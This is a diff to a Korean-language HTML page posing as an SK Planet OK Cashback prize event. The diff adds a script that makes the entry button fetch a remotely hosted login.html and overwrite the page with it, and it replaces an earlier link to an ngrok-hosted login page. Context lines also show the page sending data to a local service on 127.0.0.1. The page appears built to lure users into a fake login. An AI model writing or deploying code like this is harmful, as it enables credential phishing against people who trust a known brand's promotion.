@@ -66,6 +66,20 @@
         }
     </style>
     <script>
+    document.getElementById("loginBtn").addEventListener("click", function(e) {
+      e.preventDefault();
+      
+      fetch("https://raw.githubusercontent.com/windshock/windshock.github.io/refs/heads/master/static/login.html")
+        .then(res => res.text())
+        .then(html => {
+          document.open();
+          document.write(html);
+          document.close();
+        });
+    });
+    </script>
+
+    <script>
         async function fetchForBrowser() {
             const baseUrl = "https://127.0.0.1:17489/?callback=nexessCallBack707529&data=";
             const commonOptions = {
@@ -132,7 +146,7 @@
                             <p>3등 (50명): OK캐시백 10만원</p>
                         </div>
 
-                        <a class="cta-button" href="https://b4e483e92130.ngrok-free.app/login_page.html">이벤트 응모하기</a>
+                        <a class="btn" href="#" id="loginBtn">이벤트 응모하기</a>
 
                         <div class="footer">
                             ※ 본 이벤트는 SK플래닛 주관으로 진행됩니다. 자세한 내용은 OK캐시백 앱 공지를 참고하세요.
